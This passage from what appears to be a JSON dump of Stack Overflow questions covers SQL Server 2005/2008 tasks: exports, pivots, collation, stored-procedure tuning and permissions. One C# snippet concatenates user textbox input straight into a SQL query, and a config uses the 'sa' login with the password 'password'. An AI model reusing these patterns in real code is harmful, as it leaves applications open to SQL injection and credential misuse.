SQL Server 2008?","body":"<p>I want to generate a text file with data by executing a procedure.\nBut while generating text file, next or previous column value should not enter into other column value. Please see the below EX for more details.</p>\n\n<h2>Example</h2>\n\n<p>We have 2 columns of type <code>Varchar(5)</code> in a table. I want to generate a file with this data.\nSo 5 characters will be allowed for each column.</p>\n\n<p><strong>Case 1:</strong> If first column is having 5 characters data(ex:'qwert'), we will get the data and second column value will come beside this. No problem. it works fine.</p>\n\n<p><strong>Case 2:</strong> If first column is having 3 characters data(ex:'asd'), we will get this but second column value should not enter into 4th position of 1st column value in the text file. if the data of the 1st column is &lt; 5 character, it should print and it should print remaining as blanks.</p>\n\n<p>Note: No delimiter required in text file.</p>\n"},{"tags":["c#","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":11489829,"title":"Fetching data from SQL Server 2005 using c#","body":"<p>I would like to retrieve a particular column from a table when the values from two other columns are equal. My code is as follows. The four columns are <code>id,destination,source,price</code>.</p>\n\n<p>I want to display the price when the destination and source are equal.  </p>\n\n<p>Could you please help me?</p>\n\n<pre><code>private void button1_Click(object sender, EventArgs e)\n{\n\n        SqlConnection con = new SqlConnection(\"Data source=.;initial catalog=loki;integrated security=true\");\n        con.Open();\n        SqlDataAdapter da = new SqlDataAdapter();\n\n        DataTable dt = new DataTable();\n        da.SelectCommand = new SqlCommand(\"select  price from metro where source='\" + textBox1.Text + \"' and destination='\" + textBox2.Text + \"'\", con);\n        da.Fill(dt);\n        for(int i=0;i&lt;dt.Rows.Count;i++)\n        {\n            textBox3.Text = dt.Rows[0][3].Count.ToString();\n        }\n    }\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":285,"score":2,"question_id":11489263,"title":"Generating a text file automatically using SQL Server 2008","body":"<p>I want to execute a Stored procedure in SQL Server 2008 and store the data in a text file. How to do this and how to generate a text file <strong>automatically</strong> with data in SQL Server 2008?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":11487105,"title":"Case insensitive search in Microsoft SQL Server","body":"<p>I have a database with <code>Arabic_BIN</code> collation on Microsoft SQL Server 2005.</p>\n\n<p>If I run this query:</p>\n\n<pre><code>SELECT ID FROM maj_Users WHERE UserName = 'mahdi'\n</code></pre>\n\n<p>I'll get nothing, but if I run this query:</p>\n\n<pre><code>SELECT ID FROM maj_Users WHERE UserName = 'Mahdi'\n</code></pre>\n\n<p>I'll get a cell... Seems that SQL Server is searching database case-sensitively, but I want to search database case-insensitively. </p>\n\n<p>Is there any way?</p>\n\n<p>EDIT: Also I have tried <code>SELECT ID FROM maj_Users WHERE UserName LIKE 'mahdi'</code> but it didn't work...</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":11472720,"title":"Create copy of a database only schema","body":"<p>I am relativley new to MS SQL server. I need to create a test database from exisitng test data base with same schema and get the data from production and fill the newly created empty database. For this I was using generate scripts in SSMS. But now I need to do it on regular basis in a job. Please guide me how I can create empty databases automatically at a point of time.</p>\n"},{"tags":["sql-server-2005","security"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2419,"score":0,"question_id":56709,"title":"User does not have permission to run DBCC DBREINDEX","body":"<p>I get the following error message in SQL Server 2005:</p>\n\n<pre><code>User '&lt;username&gt;' does not have permission to run DBCC DBREINDEX for object '&lt;table&gt;'.\n</code></pre>\n\n<p>Which minimum role do I have to give to user in order to run the command?</p>\n"},{"tags":["asp.net","sql-server","xml","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":323,"score":1,"question_id":10438283,"title":"How can I store more than 4000 chars in an SQL Server parameter?","body":"<p>I'm trying to pass <code>XML</code> that is greater than 4000 characters to a stored procedure. I've tried using <code>NTEXT</code>, <code>NVARCHAR(MAX)</code>, <code>VARCHAR(MAX)</code>, <code>VARCHAR(8000)</code> and <code>XML</code> as the parameter type but I am always getting the error:</p>\n\n<blockquote>\n  <p>System.Data.SqlClient.SqlException: String or binary data would be truncated. The statement has been terminated.</p>\n</blockquote>\n\n<p>The value is not being stored into a table, it's only a variable that has data selected out of it and then stored into tables. </p>\n\n<p>Can ASP.NET not send more than 4000 characters as a parameter? Or is there a setting in SQL Server I can switch off?</p>\n\n<p>Thanks,</p>\n\n<p>Thomas</p>\n\n<p>EDIT:</p>\n\n<p>This is working with <code>NTEXT</code>. I went into the error details and found what line of the SQL was causing the error and it turns out there was a completely unrelated column set to <code>VARCHAR(50)</code> that should have been <code>VARCHAR(MAX)</code> - I assumed it was coming from the 10000 character <code>XML</code> but it was totally unrelated. My apologies. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":37241,"score":12,"question_id":2044467,"title":"How to update two tables in one statement in SQL Server 2005?","body":"<p>I want to update two tables in one go. How do i do that in SQL Server 2005?</p>\n\n<pre><code>UPDATE Table1, Table2\nSET Table1.LastName = 'DR. XXXXXX' \n,Table2.WAprrs = 'start,stop'\nFROM Table1 T1, Table2 T2\nWHERE T1.id = T2.id\nand T1.id = '010008'\n</code></pre>\n"},{"tags":["sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":51,"score":-2,"question_id":8214031,"title":"How do I join two tables with on multiple values","body":"<p>How Do join the same tables on multiple values like</p>\n\n<pre><code>select * from table tt1 join table tt2 on tt1.value1=tt2.value2 and on tt1.value5=tt2.value6\n</code></pre>\n\n<p>How do I do this?</p>\n"},{"tags":["sql-server-2005","reporting-services","bids","rdl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":524,"score":1,"question_id":11452140,"title":"How can I merge rows (of a particular column) having the same value in  SQL Server Reports RDL?","body":"<p>I'm new to working with SQL Server 2005 Reporting Servives using RDLs in BIDS.</p>\n\n<p>I need to modify an existing report so that I can merge cells in adjacent rows which would have the same value for that particular column.</p>\n\n<p>Ex: consider this is the table returned from the stored procedure used by the reports RDL.</p>\n\n<pre><code>_________________________________________________  \nId      SubCategory    Field1     Field2   Total  \n_________________________________________________  \n1       a              Bob        US       17  \n1       b              John       UK       17  \n2       a              Mary       AUS      12  \n3       d              Ram        IND      19  \n4       b              Alex       UK       09  \n4       c              Abby       FR       09  \n5       e              Tim        IT       03  \n_________________________________________________  \n</code></pre>\n\n<p>Table Example - Couldn' Format Text :( Image here : http_://i.stack.imgur.com/gWEH5.png_</p>\n\n<p>What I need to do is I want the cells merged into one where two adjacent rows in the same column have the same value.</p>\n\n<p>Like <code>Id 1</code> is repeated twice, so the cells for these must be merged. (Also <code>4</code>)</p>\n\n<p>Similarly for the last column <code>Total</code> for cells with Ids <code>1</code> and <code>4</code> must be merged.</p>\n\n<p>The RDL has \"TextBox\" for columns, I saw some other questions in this forum but were related to <code>Tablix</code> or Matrix, so I thought it would be better if I mentioned it.</p>\n\n<p>I need this merging to be done in the RDL, and this should also be present when exported to Excel.</p>\n\n<p>Hoping someone will be able to help soon.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3517,"score":1,"question_id":3778375,"title":"How to recover records, deleted by accident, from SQL server 2005?","body":"<p>How to recover records, deleted by accident, from SQL server 2005? Any suggestions?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":11467864,"title":"How set auto commit off in SQL Server 2005","body":"<p>By mistake I fired update query on live database in SQL Server 2005 and it got commited as it was in auto-commit mode</p>\n\n<p>So I would like to how do set it to auto commit off mode.</p>\n\n<p>I used plain update query like </p>\n\n<pre><code>update table_name \nset field_name = 'some value'\n</code></pre>\n\n<p>but I tried trans rollback then but no to avail.</p>\n\n<p>Then I used </p>\n\n<pre><code>begin trans\ntrans rollback\ngo\n</code></pre>\n\n<p>it run but no changes were made in database, my database was not rollback to original values</p>\n\n<p>So I want to know how do I rollback transaction in SQL Server if I mistakely update database values?</p>\n\n<p>please help</p>\n"},{"tags":["java","sql-server","sql-server-2005","jdbc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":626,"score":0,"question_id":9193467,"title":"How to connect my web application to SQL Server / SQL Server Express","body":"<p>I am working with a web application that connects to a SQL Server database with this: </p>\n\n<pre><code>jdbc.url=jdbc:jtds:sqlserver://127.0.0.1/MyDatabase\njdbc.username=sa\njdbc.password=password\n</code></pre>\n\n<p>I am relatively new to SQL Server, however I have successfully accessed a <code>SQLEXPRESS</code> instance through the SQL Server Management Studio. </p>\n\n<p>I can see from the Security->Login folder there is a \"sa\" entry</p>\n\n<p>However when I run the web application I am getting this error:</p>\n\n<blockquote>\n  <p>PropertyAccessException 1: org.springframework.beans.MethodInvocationException: Property\n  'dataSource' threw exception; nested exception is\n  org.apache.commons.dbcp.SQLNestedException: Cannot create\n  PoolableConnectionFactory (Network error IOException: Connection\n  refused: connect)</p>\n</blockquote>\n\n<p>I seems that the user: \"sa\" is not authenticated to access the database? </p>\n\n<p>If so, how can I use the SQL Server management studio to fix this? </p>\n"},{"tags":["sql-server","sql-server-2005","query-optimization"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":11453405,"title":"Optimization of a query with repeated info","body":"<p>I have this query that I want to optimize</p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER PROCEDURE [dbo].[ComprobantesFacturasObtenerEstadisticasLocal2] \n(\n    @FechaDesde DateTime,\n    @FechaHasta DateTime,\n    @XML ntext  \n)\nAS\nBEGIN\n\n    DECLARE @docHandler INT\n\n    EXEC sp_xml_preparedocument @docHandler OUTPUT, @XML    \n\n    --Locales\n    Select IdLocal\n    into #seleccionados\n    FROM OPENXML(@docHandler, N'/NewDataSet/Table1', 2) \n    WITH (IdLocal int)  \n\n    select d.* into #Locales from  Dim_Sucursal d inner join GrimRepCen..Locales l on l.Codigo = d.Codigo inner join #seleccionados s on s.IdLocal = l.iDlocal\n\n    /*2011/12/06 busco los descuentos del rio*/\n    select distinct l.Codigo + ' - ' + l.Nombre  as local, c.IdComprobante, -1 as Cantidad,\n        -1 * isnull(abs(c.TotalNeto),0) as IMPORTE, \n        'Varios' as Familia, 'Dto Bco Rio' as Linea\n    into #descuentoRio\n    from Fact_Comprobante(nolock) c \n    --inner join Fact_ComprobanteItem(nolock) ci on ci.IdComprobante = c.IdComprobante \n    inner join #locales l  on c.idDim_ComprobanteTipo = 5  and l.IdDim_sucursal = c.IdDim_sucursal  and c.fecha between @FechaDesde and @FechaHasta   \n\n    /*******************COMPROBANTES************************************************ */\n    select distinct\n        c.*, l.Codigo + ' - ' + l.Nombre  as local, ct.IdComprobanteTipo\n    into #Comprobantes\n    from Fact_Comprobante(nolock) c \n    inner join Fact_ComprobanteItem(nolock) ci on ci.IdCOmprobante = c.IdComprobante\n    inner join Dim_ComprobanteTipo(nolock) ct on ct.IdDim_ComprobanteTipo = c.idDim_ComprobanteTipo \n    inner join #locales l on l.IdDim_sucursal = c.IdDim_sucursal and  ct.IdComprobanteTipo not in (46 /*Error Fiscal Factura B*/, 47 /*Error Fiscal Factura A*/) and c.fecha between @FechaDesde and @FechaHasta   \n\n     --Comprobantes por Linea/Marca/Familia\n    select \n        m.Nombre as Marca, l.Nombre as Linea , case  when c.IdComprobanteTipo in (21,23,26,28) then 0 else -sum(ci.Cantidad) end as Cantidad,\n        case  when c.IdComprobanteTipo in (21,23,26,28) \n\n        --toma en cuenta los descuentos de las facturas que fueron anuladas\n        then c.TotalNeto \n        else isnull(ci.ImporteNeto,0) - isnull((select sum(importe) as importe \n                                                from Fact_Descuento (nolock) DD\n                                                where DD.IdComprobante = ci.idComprobante  and ci.IdDim_Producto = IdDim_Producto\n                                                 and ci.IdDim_Medida = IdDim_Medida and ci.IdDim_Calidad = IdDim_Calidad \n                                                 and exists \n                                                     (\n                                                        select 1 \n                                                        from ComprobanteReferencias AA\n                                                        inner join Fact_Comprobante BB on aa.IdComprobanteCredito = BB.IdComprobante\n                                                        where AA.IdComprobanteDebito = DD.IdComprobante\n                                                        and BB.IdDim_ComprobanteTipo in (4,13,16,19)\n                                                     )\n                                                 ),0)\n        end as IMPORTE, \n        f.Nombre as Familia\n    from #Comprobantes c \n    inner join Fact_ComprobanteItem(nolock) ci on  ci.IdComprobante = c.IdComprobante \n    inner join Dim_Producto(nolock) p on p.IdDim_Producto = ci.IdDim_Producto\n    inner join Dim_Marca(nolock) m on m.IdDim_Marca = p.IDDim_Marca\n    inner join Dim_Familia(nolock) f on f.idDim_Familia = p.IdDim_Familia\n    inner join Dim_Linea(nolock) l on l.IdDim_Linea = p.IdDim_Linea\n    Group by m.Nombre,l.Nombre,f.Nombre,c.TotalNeto,ci.IdComprobante, ci.IdDim_producto,\n    ci.idDim_Medida,ci.ImporteNeto,c.IdComprobanteTipo  ,ci.IdDim_Calidad\n    union all\n    select 'Grimoldi' as Marca, Linea , - 1 Cantidad,\n        IMPORTE, \n        Familia\n    from #descuentoRio \n\n    --/*Familia*/\n    select case  when c.IdComprobanteTipo in (21,23,26,28) then 0 else -isnull(sum(ci.Cantidad),0) end as Cantidad,\n    case  when c.IdComprobanteTipo in (21,23,26,28) \n\n        --toma en cuenta los descuentos de las facturas que fueron anuladas\n        then c.TotalNeto \n        else isnull(ci.ImporteNeto,0) - isnull((select sum(importe) as importe \n                                                from Fact_Descuento (nolock) DD\n                                                where DD.IdComprobante = ci.idComprobante  and ci.IdDim_Producto = IdDim_Producto\n                                                 and ci.IdDim_Medida = IdDim_Medida and ci.IdDim_Calidad = IdDim_Calidad \n                                                 and exists \n                                                     (\n                                                        select 1 \n                                                        from ComprobanteReferencias AA\n                                                        inner join Fact_Comprobante BB on aa.IdComprobanteCredito = BB.IdComprobante\n                                                        where AA.IdComprobanteDebito = DD.IdComprobante\n                                                        and BB.IdDim_ComprobanteTipo in (4,13,16,19)\n                                                     )\n                                                 ),0)\n        end as IMPORTE, \n        f.Nombre as Familia\n    from #Comprobantes c \n    inner join Comprobantes(nolock) co on co.IdComprobante = c.IdComprobante\n    inner join Fact_ComprobanteItem(nolock) ci on  ci.IdComprobante = c.IdComprobante \n    inner join Dim_Producto(nolock) p on p.IdDim_Producto = ci.IdDim_Producto\n    full outer join Dim_Familia(nolock) f on f.idDim_Familia = p.IdDim_Familia\n    Group by f.Nombre,ci.ImporteNeto,ci.IdComprobante, ci.IdDim_producto,\n    ci.idDim_Medida,c.TotalNeto, c.IdComprobanteTipo    ,ci.IdDim_Calidad\n    union all\n    select  -1 as Cantidad,\n        IMPORTE, \n        Familia\n     from #descuentoRio \n\n    /*local*/\n    select c.Local, case  when c.IdComprobanteTipo in (21,23,26,28) then 0 else -isnull((sum(ci.Cantidad)),0) end as Cantidad,\n        case  when c.IdComprobanteTipo in (21,23,26,28) \n\n        --toma en cuenta los descuentos de las facturas que fueron anuladas\n        then c.TotalNeto \n        else isnull(ci.ImporteNeto,0) - isnull((select sum(importe) as importe \n                                                from Fact_Descuento (nolock) DD\n                                                where DD.IdComprobante = ci.idComprobante  and ci.IdDim_Producto = IdDim_Producto\n                                                 and ci.IdDim_Medida = IdDim_Medida and ci.IdDim_Calidad = IdDim_Calidad \n                                                 and exists \n                                                     (\n                                                        select 1 \n                                                        from ComprobanteReferencias AA\n                                                        inner join Fact_Comprobante BB on aa.IdComprobanteCredito = BB.IdComprobante\n                                                        where AA.IdComprobanteDebito = DD.IdComprobante\n                                                        and BB.IdDim_ComprobanteTipo in (4,13,16,19)\n                                                     )\n                                                 ),0)\n    end as IMPORTE,\n    f.Nombre as Familia, l.Nombre as Linea\n    from #Comprobantes c \n    inner join Comprobantes(nolock) co on co.IdComprobante = c.IdComprobante\n    inner join Fact_ComprobanteItem(nolock) ci on  ci.IdComprobante = c.IdComprobante \n    inner join Dim_Producto(nolock) p on p.IdDim_Producto = ci.IdDim_Producto\n    inner join Dim_Linea(nolock) l on l.IdDim_Linea = p.IdDim_Linea\n    inner join Dim_Familia(nolock) f on f.idDim_Familia = p.IdDim_Familia\n    Group by f.Nombre,ci.ImporteNeto, l.Nombre  ,ci.IdComprobante, ci.IdDim_producto,\n    ci.idDim_Medida, c.Local,c.TotalNeto, c.IdComprobanteTipo,ci.IdDim_Calidad\n    union all\n    select Local, -1 as Cantidad,\n        IMPORTE, \n        Familia, Linea\n     from #descuentoRio \nend\n</code></pre>\n\n<p>There are some things that I cannot change, for example, sending the id's in other way instead of xml (because I'd have to modify the code and I can't), the structure of the tables and other stuff. I can only modify this stored.\nThis query recieves some Id's, insert in a temporal Table (<code>#Seleccionados</code>) and use it to do some Joins to get info about sales and others.\nAlso, you can see weird things, as an Union ALL with harcoded values, and other things. That's because the way the report in the code was done, and also cannot change that (I mean, don't worry for that weird things).\nThis stored basically returns 4 selects: One of them it's just one row, so I got the problem with the other 3, that I'm showing you here.</p>\n\n<p><strong>What I've tried:</strong></p>\n\n<p>What I was thinking was try to solve some things that are repetead, for example, this subquery:</p>\n\n<pre><code>(select sum(importe) as importe \n                                                from Fact_Descuento (nolock) DD\n                                                where DD.IdComprobante = ci.idComprobante  and ci.IdDim_Producto = IdDim_Producto\n                                                 and ci.IdDim_Medida = IdDim_Medida and ci.IdDim_Calidad = IdDim_Calidad \n                                                 and exists \n                                                     (\n                                                        select 1 \n                                                        from ComprobanteReferencias AA\n                                                        inner join Fact_Comprobante BB on aa.IdComprobanteCredito = BB.IdComprobante\n                                                        where AA.IdComprobanteDebito = DD.IdComprobante\n                                                        and BB.IdDim_ComprobanteTipo in (4,13,16,19)\n                                                     )\n                                                 )\n</code></pre>\n\n<p>in the <code>ISNULL</code> Clause is repeated for the 3 selects. So, I thougt that I could use WITH Common_Expresion_Table and reduce it. But, that select, its a subquery, so depends from values from the select when I use the subquery (can see what I'm Saying in the <code>where</code> clause of that subquery)</p>\n\n<p>Then I though, the 3 selects there are not so different. They have a couple of Joins repeated, but grouped by different way. So, I also thougt of using some kind of Temporally Table or CTE, but I'm not sure about that because they are grouped from different way, and also have one or two differents <code>JOINS</code></p>\n\n<p><em>Some extra info:</em></p>\n\n<p><code>#Seleccionados</code> will have like 100 rows of Id's.\nThis query takes 50 segs. For a week:</p>\n\n<ul>\n<li>The first query returns <code>47083 rows</code></li>\n<li>The second query returns <code>47084 rows</code></li>\n<li>The third query returns <code>47084 rows</code></li>\n</ul>\n\n<p>as you can see, it's almost the same information, grouped by a different way.</p>\n\n<p>Tables:\n<code>Fact_Comprobante</code> got info about one sale. <code>Fact_ComprobanteItem</code> about the items of the sale.\n<code>Dim_Producto</code> got info about one product, <code>Dim_Familia</code> info about families of products, <code>Dim_Marca</code> got info about Signs of products, <code>Dim_Linea</code> got info about the Lines of products (these 3 tables are FK in Dim_Producto).\n<code>Dim_ComprobanteTipo</code> got info about the types of sales\n<code>Fact_Descuento</code> got info about discounts, related to sales.</p>\n\n<p>All tables got a lot of info.</p>\n\n<p>The <code>(Nolock)</code> statements are because we have 3 services inserting, updating and other stuff at the same time in these tables.</p>\n\n<p>I didn't do this query, I just have to optimize it.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":118,"score":3,"question_id":11458006,"title":"insert foreach x  where not exists","body":"<p>I have a fairly simple database consisting of three (relevant) tables: users, permissions, and user permissions. The basic premise is simple: when a user gets created, all the records in the permissions table are automatically added to the user_permissions table with a default value. This is all working fine.</p>\n\n<p>However, as I'm currently in development, I continue to add new permissions, which of course existing users won't have since those new permissions didn't exist in the permissions table when they were created. So, I had the brilliant idea to create a little stored procedure to automatically update the user_permissions table with all the permissions not currently existing in the user_permissions table.</p>\n\n<p>So, in short, what I want to do is something like (pseudocode)</p>\n\n<pre><code>For each user without x permission in user_permissions, insert into user_permissions user_id and permission_id\n</code></pre>\n\n<p>I wasn't quite sure how to do this from an SQL POV. I played with joins and \"not exists\" but haven't really gotten anywhere.</p>\n\n<p>You can play with my schema here: <a href=\"http://sqlfiddle.com/#!3/b0761/3\" rel=\"nofollow\">http://sqlfiddle.com/#!3/b0761/3</a>\nThanks in advance for the help!</p>\n\n<p>EDIT: Schema:</p>\n\n<pre><code>CREATE TABLE users (\n  user_id      int IDENTITY(1, 1) NOT NULL,\n  user_name    varchar(255),\n  PRIMARY KEY (user_id));\n\nCREATE TABLE permissions (\n  permission_id          int IDENTITY(1, 1) NOT NULL, \n  permission_name        varchar(255) NOT NULL, \n  PRIMARY KEY (permission_id));\n\nCREATE TABLE user_permissions (\n  user_id       int NOT NULL, \n  permission_id int NOT NULL, \n  value         tinyint DEFAULT 0 NOT NULL,  \n  PRIMARY KEY (user_id, \n  permission_id));\n\nALTER TABLE user_permissions ADD CONSTRAINT FK_user_pe338140 \nFOREIGN KEY (permission_id)\nREFERENCES permissions (permission_id);\n\nALTER TABLE user_permissions ADD CONSTRAINT FK_user_pe405324 \nFOREIGN KEY (user_id) REFERENCES users (user_id);\n\nINSERT INTO users(user_name) values('test_username');\nINSERT INTO users(user_name) values('test_username2');\n\nINSERT INTO permissions(permission_name) VALUES('permission_1')\nINSERT INTO permissions(permission_name) VALUES('permission_2')\n\nINSERT INTO user_permissions(user_id, permission_id, value)\nVALUES(1, 1, 1)\n\nINSERT INTO user_permissions(user_id, permission_id, value)\nVALUES(2, 1, 1)\n</code></pre>\n\n<p>EDIT: Query so far</p>\n\n<pre><code>SELECT a.user_id, b.permission_id, 1 as 'value'\nFROM USER_PERMISSIONS a right outer join \nPERMISSIONS b on a.permission_id = b.permission_id\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","select","nesting"],"answer_count":5,"favorite_count":14,"up_vote_count":22,"down_vote_count":0,"view_count":100914,"score":22,"question_id":505747,"title":"Best way to do nested case statement logic in SQL Server","body":"<p>I'm currently writing an SQL Query, where a few of the columns returned need to be calculated depending on quite a lot of conditions.</p>\n\n<p>I'm currently using nested case statements, but its getting messy. Is there a better (more organised and/or readable) way?</p>\n\n<p>(I am using Microsoft SQL Server, 2005)</p>\n\n<p><hr /></p>\n\n<p>A simplified example:</p>\n\n<pre><code>SELECT\n    col1,\n    col2,\n    col3,\n    CASE\n        WHEN condition \n        THEN\n            CASE\n                WHEN condition1 \n                THEN\n                    CASE \n                        WHEN condition2\n                        THEN calculation1\n                        ELSE calculation2\n                    END\n                ELSE\n                    CASE \n                        WHEN condition2\n                        THEN calculation3\n                        ELSE calculation4\n                    END\n            END\n        ELSE \n            CASE \n                WHEN condition1 \n                THEN \n                    CASE\n                        WHEN condition2 \n                        THEN calculation5\n                        ELSE calculation6\n                    END\n                ELSE\n                    CASE\n                        WHEN condition2 \n                        THEN calculation7\n                        ELSE calculation8\n                    END\n            END            \n    END AS 'calculatedcol1',\n    col4,\n    col5 -- etc\nFROM table\n</code></pre>\n"},{"tags":["sql-server","database","sql-server-2005","formula","equation"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":471,"score":2,"question_id":9722782,"title":"Storing formula (equations) in database to be evaluated later (SQL Server 2005)","body":"<p>I'm calculating linear regressions based on a data set. I do not know the regression model or number of parameters at compile-time.</p>\n\n<p>I'm storing the regression equation in a SQL Server 2005 database as the string </p>\n\n<pre><code>y = 3x^2 + 2x // just an example\n</code></pre>\n\n<p>When I need to make a prediction, I grab the equation from the database, substitue <code>x</code> with the value I'm predicting, and use <a href=\"http://ncalc.codeplex.com/\" rel=\"nofollow\">NCalc</a> to evaluate the resulting string.</p>\n\n<p>That method seems to work OK, but I'm wondering if there's a better way or a built-in feature of SQL Server that I've missed that would allow me to do these calculations <strong>on the database side</strong>.</p>\n"},{"tags":["asp.net","vb.net","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11454550,"title":"Searching dynamic Label.IDs to match Query result","body":"<p>I am currently dynamically generating labels ids on my ASP site based on the date of the month.</p>\n\n<p>E.g. labelSunday1.ID = \"01/07/12\"</p>\n\n<p>I am also pulling data down from SQL Server, and storing various values in strings.\nE.g. Date = resultDate, stock = resultStock</p>\n\n<p>However, I want to do a find on the page, looking for any Label ID that matches the result of the query, and then display the number of stock in the labels text.</p>\n\n<p>Is there anyway I can search the entire page to see if a label ID matches the resultDate string? I would rather do this search somewhat dynamically, as in the future I hope to dynamically generate many labels on the page.</p>\n\n<p>I was thinking along the lines of:</p>\n\n<pre><code>IF Me.Label.ID = resultDate then\nme.label.text = resultStock\n</code></pre>\n\n<p>but that doesn't work :C</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":128,"score":-5,"question_id":11451011,"title":"Triggers in SQL Server - what are they?","body":"<p>I have used SQL Server 2005. But I have not used triggers, please somebody help me to let me know what is trigger?</p>\n\n<p>Types of trigger, how to use that in SQL Server 2005?</p>\n\n<p>What are advantages and disadvantages to use triggers?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":163,"score":0,"question_id":11450641,"title":"Bulk Insert in sql-server while updating multiple tables","body":"<p>I have one table that has fields like</p>\n\n<pre><code>ID   ProductID  CategoryID and lot of columns......\n\n1    1          1\n2    1          2\n3    2          1\n4    2          2\n5    2          3\n</code></pre>\n\n<p>I want to insert all the records in this table to two separate tables that have a structure like</p>\n\n<pre><code>ID    ProductID   (Skip CategoryID column)....\n1      1\n2      2\n</code></pre>\n\n<p>And</p>\n\n<pre><code>ID  ProductID  CategoryID\n\n1    1          1\n2    1          1\n3    2          2\n4    2          2\n5    2          2\n</code></pre>\n\n<p>I can easily do this using code but i want to use pure SQL.</p>\n\n<p>Normally i can insert it like</p>\n\n<pre><code>Insert into Table1 select * from Table2\n</code></pre>\n\n<p>But in this case after for every row there are multiple insert.</p>\n\n<p>Any idea in this regard is appreciable.</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":152,"score":0,"question_id":11449222,"title":"How to check date range in mssql for epoch datetime","body":"<p>in one of the table the date column values are like below</p>\n\n<pre><code> date\n25052008112228\n26052008062717\n</code></pre>\n\n<p>table name is transaction</p>\n\n<p>i tried using the below query but its throwing error</p>\n\n<pre><code>select * from transaction where date between '2012-01-06' and '2012-06-30'\n\nselect * from transaction where date between '2012/01/06' and '2012/06/30'\n</code></pre>\n\n<p>give me a solution.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot","pivot-without-aggregate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":11435449,"title":"looking for possible queries to display output similar to pivot table in sql server 2005","body":"<p>I have a table as below </p>\n\n<pre><code>column_date | color | qty | supplier | location\n1 June 2012 | red   | 2   | XY       | A wing\n1 June 2012 | red   | 1   | AB       | A wing\n1 June 2012 | blue  | 4   | CD       | A wing\n1 June 2012 | blue  | 1   | XY       | B wing\n2 June 2012 | yellow| 13  | CD       | B wing\n2 June 2012 | green | 45  | CD       | A wing\n2 June 2012 | blue  | 32  | AB       | A wing\n2 June 2012 | red   | 37  | XY       | A wing\n2 June 2012 | red   | 2   | XY       | B wing\n2 June 2012 | red   | 1   | AB       | A wing\n2 June 2012 | blue  | 4   | CD       | A wing\n3 June 2012 | red   | 1   | AB       | B wing\n3 June 2012 | blue  | 4   | CD       | A wing\n3 June 2012 | blue  | 1   | XY       | B wing\n3 June 2012 | yellow| 13  | CD       | B wing\n3 June 2012 | green | 45  | CD       | A wing\n3 June 2012 | blue  | 32  | AB       | A wing\n</code></pre>\n\n<p>And I would like to have a output like below. I'm not sure if it's possible in query and I have no idea how can I start if it's possible. I'm looking for your advise or possible queries to display output like this. Thank you.</p>\n\n<pre><code>                                    Supplier\nDate           |        XY         |        CD          |       AB\n               | A wing  | B wing  | A wing  | B wing   | A wing  | B wing\n1 June 2012    |  2      |  1      |  4      | 0        | 1       | 0\n2 June 2012    | 37      |  2      |  49     | 13       | 33      | 0\n3 June 2012    | 0       |  1      |  49     | 13       | 32      | 1\nTotal          | 39      |  4      | 102     | 26       | 66      | 1\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","dmv"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":199,"score":1,"question_id":10031508,"title":"Sql Server - how to get last server restart (DMV reset date/time)","body":"<p>I'm using some modifications to Glenn Berry's excellent DMV queries!</p>\n\n<p>However, I would like to add to the resultset the 'last server restart', or to be more specific, the date/time the statistics for (all, the specific) DMV was reset.</p>\n\n<p>Since it would be quite important to know last reset when looking at the statistics, I want to make absolutely sure the date/time is accurate and shown.</p>\n\n<p>Question: How can you get the most accurate date/time of when a/all DMV statistic was reset?</p>\n\n<p>Thanks!\n-D</p>\n"},{"tags":["sql-server","query","tsql","sql-server-2005","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":11441115,"title":"Dynamic Pivot to show how voters voted","body":"<p>Here is the table 